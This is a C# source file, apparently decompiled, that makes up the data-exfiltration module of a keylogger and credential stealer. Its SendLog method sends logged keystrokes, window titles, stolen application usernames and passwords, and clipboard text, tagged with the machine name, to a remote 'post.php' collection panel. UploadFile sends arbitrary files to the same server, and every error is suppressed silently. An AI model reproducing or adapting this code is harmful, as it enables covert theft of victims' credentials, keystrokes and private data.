using System;
using System.IO;
using System.Net;
using System.Text;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

internal class Send
{
	public static void SendLog(string Link, string LogType, string WindowTitle, string KeystrokesTyped, string Application, string Host, string Username, string Password, string ClipboardText)
	{
		try
		{
			WebClient webClient = new WebClient();
			switch (LogType)
			{
			case "Keystrokes":
				webClient.DownloadString(Link + "post.php?type=keystrokes&machinename=" + Get_Comp() + "&windowtitle=" + WindowTitle + "&keystrokestyped=" + KeystrokesTyped + "&machinetime=" + DateAndTime.get_Now().ToShortTimeString());
				break;
			case "Passwords":
				webClient.DownloadString(Link + "post.php?type=passwords&machinename=" + Get_Comp() + "&application=" + Application + "&link=" + Host + "&username=" + Username + "&password=" + Password);
				break;
			case "Clipboard":
				webClient.DownloadString(Link + "post.php?type=clipboard&machinename=" + Get_Comp() + "&windowtitle=" + WindowTitle + "&clipboardtext=" + ClipboardText + "&machinetime=" + DateAndTime.get_Now().ToShortTimeString());
				break;
			case "Screenshot":
				break;
			case "Notification":
				webClient.DownloadString(Link + "post.php?type=notification&machinename=" + Get_Comp() + "&machinetime=" + DateAndTime.get_Now().ToShortTimeString());
				break;
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public static string Get_Comp()
	{
		return Environment.MachineName;
	}

	public static void UploadFile(string Link, string Path)
	{
		try
		{
			WebClient webClient = new WebClient();
			byte[] bytes = webClient.UploadFile(Link, Path);
			Encoding.UTF8.GetString(bytes);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public static string Program_data(string a)
	{
		return Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData), a);
	}

	public static string Clip_Text()
	{
		return Clipboard.GetText();
	}
}
